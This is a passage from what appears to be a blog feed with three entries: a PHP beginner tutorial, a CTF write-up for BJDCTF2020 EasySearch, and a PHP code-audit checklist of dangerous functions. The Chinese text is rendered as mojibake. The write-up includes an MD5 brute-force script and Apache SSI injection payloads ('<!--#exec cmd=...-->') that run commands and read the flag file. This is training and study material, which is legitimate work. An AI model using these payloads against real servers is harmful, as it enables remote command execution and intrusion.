alt="image-20210903150637332"></p><p>ä»¥ä¸Šä»£ç å¹¶æ²¡æœ‰æ˜¾ç¤ºåŸå§‹çš„PHPè¯­å¥</p><p>è¿™æ˜¯å› ä¸ºPHPè§£é‡Šå™¨å·²ç»è¿è¡Œäº†è¯¥è„šæœ¬ï¼Œå¹¶ä¸”ç”¨è¯¥è„šæœ¬çš„è¾“å‡ºä»£æ›¿äº†è„šæœ¬çš„æœ¬èº«ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡PHPï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆèƒ½åœ¨ä»»ä½•æµè§ˆå™¨ä¸­æŸ¥çœ‹çš„çº¯HTMLï¼Œæ¢ä¸€ä¸ªæ„æ€ç†è§£ï¼Œç”¨æˆ·çš„æµè§ˆå¹¶ä¸éœ€è¦ç†è§£PHPã€‚</p><p>æ­¤æ–‡ä»¶ç»„æˆï¼š</p><p>1.HTML 2.PHPæ ‡è®° 3.PHPè¯­å¥ 4.ç©ºæ ¼</p><p>1.3.1</p><p>PHPæ ‡è®°</p><?php    ä¸ºå¼€å§‹ï¼Œ?><p>ä¸ºç»“æŸ</p><p>â€‹        è¿™æ ·çš„æ ‡è®°ç§°ä½œPHPæ ‡è®°ï¼Œå¯ä»¥å‘Šè¯‰æœåŠ¡å™¨PHPä»£ç çš„å¼€å§‹å’Œç»“æŸã€‚</p><p>XMLé£æ ¼(å»ºè®®ä½¿ç”¨)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>ç®€çŸ­é£æ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>1.3.2</p><p>PHPè¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;;</span><br></pre></td></tr></table></figure><p>echoè¯­å¥ï¼šå°†ä¼ é€’ç»™å…¶è‡ªèº«çš„å­—ç¬¦ä¸²æ‰“å°æˆ–è€…å›æ˜¾åˆ°æµè§ˆå™¨</p><p>1.7.1</p><p>PHPçš„æ•°æ®ç±»å‹</p><p>1.æ•´æ•°    Integer</p><p>2.æµ®ç‚¹æ•°    Float</p><p>3.å­—ç¬¦ä¸²    String</p><p>4.å¸ƒå°”    Boolean</p><p>5.æ•°ç»„    Array</p><p>6.å¯¹è±¡    Object</p><p>é™„ï¼šä¸‰ä¸ªç‰¹æ®Šç±»å‹ NULLï¼ˆç©ºï¼‰ã€resourceï¼ˆèµ„æºï¼‰ã€</p><p>callable ã€‚</p><p>1.7.2</p><p>ç±»å‹å¼ºåº¦</p><p>PHPæ˜¯ä¸€ç§å¼±ç±»å‹ï¼Œæˆ–è€…åŠ¨æ€å‹è¯­è¨€</p><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$total1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">$total2 &#x3D; 0.00;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ$total1æ˜¯ä¸€ä¸ªæ•´æ•°ç±»å‹çš„å˜é‡</p><p>è€Œ$total2æ˜¯ä¸€ä¸ªæµ®ç‚¹ç±»å‹çš„å˜é‡ã€‚</p><p>è‹¥æ·»åŠ ä»¥ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total2 &#x3D; &#39;Hello&#39;;</span><br></pre></td></tr></table></figure><p>åˆ™$total2æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å˜é‡ã€‚</p><p>1.7.3</p><p>ç±»å‹è½¬æ¢</p><p>1.7.4</p><p>å¯å˜å˜é‡</p><p>é™„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">     &lt;title&gt;Bob&#39;s Auto Parts - Order Results&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;h1&gt;Bob&#39;s Auto Parts&lt;&#x2F;h1&gt;</span><br><span class="line"> &lt;h2&gt;Order Results&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;  echo &#39;&lt;p&gt; Order Processed.&lt;&#x2F;p&gt;&#39;</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;    echo &quot;&lt;p&gt;Order processed at &quot;;</span><br><span class="line">&#x2F;&#x2F;    echo date(&#39;H:i, jS F Y&#39;);</span><br><span class="line">&#x2F;&#x2F;    echo &quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">  echo &quot;&lt;p&gt;Order processed at &quot;.date(&#39;H:i, jS F Y&#39;).&quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">  $tireqty &#x3D; $_POST[&#39;tireqty&#39;];</span><br><span class="line">  $oilqty &#x3D; $_POST[&#39;oilqty&#39;];</span><br><span class="line">  $sparkqty &#x3D; $_POST[&#39;sparkqty&#39;];</span><br><span class="line">  $address &#x3D; $_POST[&#39;address&#39;];</span><br><span class="line">  echo &#39;&lt;p&gt;Your order is as follows: &lt;&#x2F;p&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($tireqty).&#39; tires&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($oilqty).&#39; bottle of oil&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($sparkqty).&#39; spark plugs&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo &#39;address is &#39;.htmlspecialchars($address);</span><br><span class="line"> ?&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;  echo phpinfo();</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line"> $totalqty  &#x3D; 0;</span><br><span class="line"> $totalqty &#x3D; $tireqty + $oilqty + $sparkqty;</span><br><span class="line"> echo &quot;&lt;p&gt;Items ordered :&quot;. $totalqty.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"> $totalomunt &#x3D; 0.00;</span><br><span class="line"></span><br><span class="line"> define(&#39;TIREPRICE&#39;, 100);</span><br><span class="line"> define(&#39;OILPRICE&#39;, 10);</span><br><span class="line"> define(&#39;SPARKPRICE&#39;, 4);</span><br><span class="line"> $totalomunt &#x3D; $tireqty * TIREPRICE</span><br><span class="line">     + $oilqty * OILPRICE</span><br><span class="line">     + $sparkqty * SPARKPRICE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> echo &quot;Subtotal: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line"> $taxrate &#x3D; 0.10;</span><br><span class="line"> $totalomunt &#x3D; $totalomunt * (1+ $taxrate);</span><br><span class="line"> echo &quot;Total including tax: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line"> ?&gt;</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; ä»åˆ›å»ºç¤ºä¾‹Webåº”ç”¨å¼€å§‹ï¼šBobçš„æ±½è½¦é›¶éƒ¨ä»¶å•†åº—&lt;/p&gt;
&lt;p&gt;åˆ›å»ºè®¢å•è¡¨å•ï¼š&lt;/p&gt;
&lt;p&gt;ä»»ä½•æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€æœ€å¸¸è§çš„åº”ç”¨åœºæ™¯æ˜¯ä¹‹ä¸€&lt;/p&gt;
&lt;p&gt;1.1&lt;/p&gt;
&lt;p&gt;å°±æ˜¯å¤„ç†HTMLè¡¨å•ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥ç¨‹åºæ¸…å•1-1ï¼šorder.htmlï¼Œå•†åº—åŸºç¡€HTML</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <link href="http://daweitech.github.io/2021/09/02/buu/18/"/>
    <id>http://daweitech.github.io/2021/09/02/buu/18/</id>
    <published>2021-09-02T11:56:57.000Z</published>
    <updated>2021-09-02T12:57:15.636Z</updated>
    
    <content type="html"><![CDATA[<p> å‚è€ƒåšå®¢ï¼š</p><p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p><p>æ‰“å¼€ååªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†</p><p>å°è¯•äº†ä¸€ä¸‹sqlæ³¨å…¥</p><p>åªä¼šå‡ºç°ä¸€æ ·çš„å¼¹æ¡†</p><p><img src="/2021/09/02/buu/18/image-20210902195901927.png" alt="image-20210902195901927"></p><p>æ‰«æç›®å½•åå‘ç°è¿˜æœ‰swpæ–‡ä»¶</p><p>è®¿é—®å¾—åˆ°æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;</span><br><span class="line">$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times</span><br><span class="line">$content &#x3D; uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin &#x3D; &#39;6d0bc1&#39;;</span><br><span class="line">        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text &#x3D; &#39;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&#39;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ˜ å…¥çœ¼å¸˜çš„å°±æ˜¯hashå‡½æ•°</p><p>æ³¨æ„åˆ°ç™»é™†ä»£ç </p><p><img src="/2021/09/02/buu/18/image-20210902200408592.png" alt="image-20210902200408592"></p><p>â€‹        è§£é‡Šèµ·æ¥ï¼Œå°±æ˜¯passwordå¿…é¡»hashåŠ å¯†åè¦ç­‰äº6d0bc1ï¼Œæ»¡è¶³åå°±ä¼šè¾“å‡ºscriptå¼¹çª— </p><p>â€˜Welcome to manage systemâ€™</p><p><img src="/2021/09/02/buu/18/image-20210902200802654.png" alt="image-20210902200802654"></p><p>ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç›¸åº”çš„shtmlæ–‡ä»¶</p><p>å¼€å§‹è§£é¢˜</p><p>å…ˆå¾—åˆ°è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">string &#x3D; &#39;0123456789&#39;</span><br><span class="line">class BF(threading.Thread):</span><br><span class="line">    def __init__(self,left,right):</span><br><span class="line">        threading.Thread.__init__(self) #çˆ¶ç±»çš„æ„é€ æ–¹æ³•</span><br><span class="line">        self.left &#x3D; left</span><br><span class="line">        self.right &#x3D; right</span><br><span class="line">    def run(self):</span><br><span class="line">        admin &#x3D; &#39;6d0bc1&#39;</span><br><span class="line">        for i in range(self.left,self.right):</span><br><span class="line">            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">            if s[:6] &#x3D;&#x3D; admin:</span><br><span class="line">                print i</span><br><span class="line">threads &#x3D; []</span><br><span class="line">thread_count &#x3D; 5</span><br><span class="line">for i in range(thread_count):</span><br><span class="line">    threads.append(BF(i*2000000, (i+1)*2000000))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·‘å®Œåï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\#2020666</span><br><span class="line">\#2305004</span><br><span class="line">\#9162671</span><br></pre></td></tr></table></figure><p>é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå¯†ç ç™»å½•</p><p>ç„¶åæŸ¥çœ‹ç½‘ç»œçŠ¶æ€</p><p><img src="/2021/09/02/buu/18/image-20210902201334561.png" alt="image-20210902201334561"></p><p>ç”¨è¿™é‡Œçš„è·¯å¾„è®¿é—®ä¸‹</p><p><img src="/2021/09/02/buu/18/image-20210902201420408.png" alt="image-20210902201420408"></p><p>çœ‹wpçŸ¥é“äº†åé¢ç”¨sstiæ¨¡æ¿æ³¨å…¥</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><p><strong>Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</strong><br>é“¾æ¥ï¼š</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒ,æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtml,åˆ©ç”¨è¯­æ³•æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä½¿ç”¨SSI(Server Side Include)çš„htmlæ–‡ä»¶æ‰©å±•åï¼ŒSSIï¼ˆServer Side Include)ï¼Œé€šå¸¸ç§°ä¸ºâ€æœåŠ¡å™¨ç«¯åµŒå…¥â€æˆ–è€…å«â€æœåŠ¡å™¨ç«¯åŒ…å«â€ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºASPçš„åŸºäºæœåŠ¡å™¨çš„ç½‘é¡µåˆ¶ä½œæŠ€æœ¯ã€‚é»˜è®¤æ‰©å±•åæ˜¯ .stmã€.shtm å’Œ .shtmlã€‚</p><p>usernameæˆä¸ºæ³¨å…¥ç‚¹</p><!--#exec cmd="whoami"--><p><img src="/2021/09/02/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p><!--#exec cmd="ls"--><p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p><!--#exec cmd="ls ../"-->  #çœ‹ä¸€ä¸‹ä¸Šå±‚ç›®å½•<p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p><p>æ‰¾åˆ°äº†</p><!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--><p><img src="/2021/09/02/buu/18/image-20210902202133502.png" alt="image-20210902202133502"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; å‚è€ƒåšå®¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/devilare/article/details/119351945&quot;&gt;https://blog.csdn.net/devilare/article/details/119351945</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç å®¡è®¡(äºŒ)</title>
    <link href="http://daweitech.github.io/2021/09/02/php/0/"/>
    <id>http://daweitech.github.io/2021/09/02/php/0/</id>
    <published>2021-09-02T09:57:07.000Z</published>
    <updated>2021-09-02T12:56:37.441Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æœç´¢ move_uploaded_file()å‡½æ•°, åœ¨PHPä¸­ä¸Šä¼ å‡½æ•°åªæœ‰è¿™ä¸€ä¸ª</p><p>2.æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶çš„ä»£ç æ˜¯å¦å­˜åœ¨é™åˆ¶æˆ–å¯ä»¥ç»•è¿‡</p><p>3.æœç´¢includeã€requireã€include_onceã€require_onceå‡½æ•°ï¼Œ</p><p>æ˜¯å¦å­˜åœ¨å¯æ§å˜é‡ã€‚</p><p>4.è¿½è¸ªç¨‹åºè¿è¡Œæµç¨‹ï¼ŒæŸ¥çœ‹æ¨¡å—åŠ è½½æ—¶åŒ…å«çš„æ–‡ä»¶æ˜¯å¦å¯æ§ã€‚</p><p><img src="/2021/09/02/php/0/capture_20210902180930752.bmp" alt="capture_20210902180930752"></p><p>ä»»æ„æ–‡ä»¶è¯»å–ã€ä¸‹è½½ã€å†™å…¥ã€åˆ é™¤ã€æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</p><p>é»‘ç›’çœ‹åŠŸèƒ½ç‚¹å¯¹åº”çš„æ–‡ä»¶ï¼Œ å†å»è¯»æ–‡ä»¶</p><p>æœç´¢æ–‡ä»¶è¯»å–çš„å‡½æ•°ï¼Œ æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ç›´æ¥æˆ–è€…ç›´æ¥æ§åˆ¶çš„å˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contentsã€highlight_fileã€fopenã€readfileã€freadã€</span><br><span class="line"></span><br><span class="line">fgetssã€fgetsã€parse_ini_fileã€show_sourceã€fileã€fwriteã€</span><br><span class="line"></span><br><span class="line">file_put_contentsã€unlink</span><br></pre></td></tr></table></figure><p><img src="/2021/09/02/php/0/image-20210902181425601.png" alt="image-20210902181425601"></p><h4 id="SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>SSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æ‰¾å¯¹åº”åŠŸèƒ½ç‚¹ï¼Œç›´æ¥é»‘ç›’æµ‹è¯•æŸ¥çœ‹æ˜¯å¦èƒ½ç®€å•åˆ©ç”¨ï¼Œä¸èƒ½å†å»è¿½è¸ªæµç¨‹åˆ†æä¼ é€’è¿‡ç¨‹ã€‚</p><p>2.ç™½ç›’æŒ–æ˜åˆ™éœ€è¦æœç´¢å¸¦æœ‰å˜é‡å‚æ•°çš„ç›¸å…³å‡½æ•°</p><p>3.file_get_contents()</p><p>4.fsockopen()</p><p>5.curl_exec()</p><p>6.fopen()</p><p><img src="/2021/09/02/php/0/image-20210902203610020.png" alt="image-20210902203610020"></p><h4 id="ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>ä»£ç æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.å¯»æ‰¾ç›¸å…³ä»£ç çš„æ•æ„Ÿå‡½æ•°ï¼Œ å›æº¯è·Ÿè¸ª</p><p>2.evalã€assertã€preg_repleaceã€$_ GET($_POST[]);</p><p>call_user_funcã€call_user_func_arrayã€array_mapç­‰å‡½æ•°ã€‚</p><p><img src="/2021/09/02/php/0/image-20210902204019087.png" alt="image-20210902204019087"></p><h4 id="å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.å¯»æ‰¾ç›¸å…³ä»£ç çš„æ•æ„Ÿå‡½æ•°ï¼Œå›æº¯è·Ÿè¸ª</p><p>2.systemã€execã€shell_execã€passthru</p><p>åå¼•å·``ã€popenã€ob_startã€pcntl_exec</p><p>proc_open</p><p><img src="/2021/09/02/php/0/image-20210902204301956.png" alt="image-20210902204301956"></p><h4 id="SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>SQLæ³¨å…¥æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.è·Ÿè¸ªå‚æ•°ä¼ é€’æ˜¯å¦å­˜åœ¨è¿‡æ»¤ï¼Œæ•°æ®åº“æŸ¥è¯¢æ˜¯å¦ä½¿ç”¨é¢„ç¼–è¯‘</p><p>2.ä¸€èˆ¬æ•°æ®åº“æŸ¥è¯¢ä¼šè¢«å°è£…åœ¨å‡ ä¸ªæ ¸å¿ƒæ–‡ä»¶ä¸­ï¼Œåå¤è°ƒç”¨ã€‚å½“ç„¶åœ¨æŸäº›å¤æ‚çš„åŠŸèƒ½ä¸­ï¼Œ</p><p>å¯èƒ½ä¹Ÿä¼šå­˜åœ¨ä¸ä½¿ç”¨å°è£…çš„å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦å…¨é¢æ’æŸ¥ã€‚</p><p>3.åœ¨æŒ–æ˜çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿè¦æ³¨æ„å®½å­—èŠ‚æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥ç­‰æ–¹æ³•çš„å¯èƒ½æ€§ã€‚</p><p><img src="/2021/09/02/php/0/image-20210902204505442.png" alt="image-20210902204505442"></p><h4 id="XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>XSSæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æŸ¥çœ‹å‚æ•°ä¼ é€’è¿›å…¥åˆ°è¾“å‡ºæ˜¯å¦å­˜åœ¨è¿‡æ»¤å‡½æ•°</p><p>2.å¸¸è§çš„è¾“å‡ºå‡½æ•°ï¼Œprintã€print_rã€echoã€printfã€sprintã€die</p><p>var_dumpã€var_exportç­‰</p><p><img src="/2021/09/02/php/0/image-20210902204739145.png" alt="image-20210902204739145"></p><h4 id="CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"><a href="#CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨" class="headerlink" title="CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨"></a>CSRFæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</h4><p>1.æŸ¥çœ‹æäº¤æ•°æ®åŠŸèƒ½ç‚¹ï¼ŒæŠ“åŒ…æŸ¥çœ‹æ˜¯å¦tokenï¼ŒæŸ¥çœ‹æ ¸å¿ƒä»£ç ä¸­æ˜¯å¦å­˜åœ¨tokenæˆ–è€…refereræ ¡éªŒ</p><p>2.å¯ä»¥ç›´æ¥æœç´¢tokenã€refererå…³é”®å­—</p><p>ååºåˆ—åŒ–æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</p><p>æœç´¢å¸¦æœ‰å˜é‡å‚æ•°çš„ååºåˆ—åŒ–å‡½æ•°unserliaze()ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨åˆ©ç”¨ç‚¹</p><p>ååºåˆ—åŒ–ä¸­éœ€å…³æ³¨çš„å‡½æ•°</p><p><img src="/2021/09/02/php/0/image-20210902205114294.png" alt="image-20210902205114294"></p><h4 id="installç³»ç»Ÿé‡è£…æ¼æ´"><a href="#installç³»ç»Ÿé‡è£…æ¼æ´" class="headerlink" 